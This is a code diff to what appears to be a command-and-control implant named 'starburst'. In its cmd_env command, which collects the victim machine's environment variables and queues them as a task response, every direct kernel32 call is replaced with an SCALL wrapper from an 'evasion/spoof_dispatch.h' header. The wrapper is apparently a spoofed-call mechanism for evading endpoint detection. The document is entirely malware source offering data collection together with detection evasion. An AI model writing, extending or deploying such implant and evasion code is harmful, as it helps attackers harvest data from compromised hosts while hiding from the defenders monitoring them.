@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_ENV
 
@@ -17,7 +18,7 @@ auto declfn starburst::cmd_env(
 ) -> void {
     (void)params;
 
-    auto env_block = inst.kernel32.GetEnvironmentStringsW();
+    auto env_block = (LPWCH)SCALL( inst, kernel32.GetEnvironmentStringsW );
     if ( !env_block ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "GetEnvironmentStringsW failed" ) ) );
@@ -28,7 +29,7 @@ auto declfn starburst::cmd_env(
     uint32_t total_wchars = 0;
     auto p = env_block;
     while ( *p ) {
-        uint32_t entry_len = inst.kernel32.lstrlenW( p );
+        uint32_t entry_len = (DWORD)SCALL( inst, kernel32.lstrlenW, p );
         total_wchars += entry_len + 1;
         p += entry_len + 1;
     }
@@ -37,7 +38,7 @@ auto declfn starburst::cmd_env(
     uint32_t buf_size = total_wchars * 4 + 1;
     auto output = static_cast<char*>( inst.heap_alloc( buf_size ) );
     if ( !output ) {
-        inst.kernel32.FreeEnvironmentStringsW( env_block );
+        SCALL( inst, kernel32.FreeEnvironmentStringsW, env_block );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
         return;
@@ -46,8 +47,8 @@ auto declfn starburst::cmd_env(
     uint32_t offset = 0;
     p = env_block;
     while ( *p ) {
-        uint32_t entry_len = inst.kernel32.lstrlenW( p );
-        int converted = inst.kernel32.WideCharToMultiByte(
+        uint32_t entry_len = (DWORD)SCALL( inst, kernel32.lstrlenW, p );
+        int converted = (int)SCALL( inst, kernel32.WideCharToMultiByte,
             CP_UTF8, 0, p, entry_len, output + offset, buf_size - offset - 2, nullptr, nullptr );
         offset += converted;
         output[offset++] = '\n';
@@ -55,7 +56,7 @@ auto declfn starburst::cmd_env(
     }
     output[offset] = '\0';
 
-    inst.kernel32.FreeEnvironmentStringsW( env_block );
+    SCALL( inst, kernel32.FreeEnvironmentStringsW, env_block );
     queue_response( inst, task_uuid, RESPONSE_SUCCESS, output );
     inst.heap_free( output );
 }
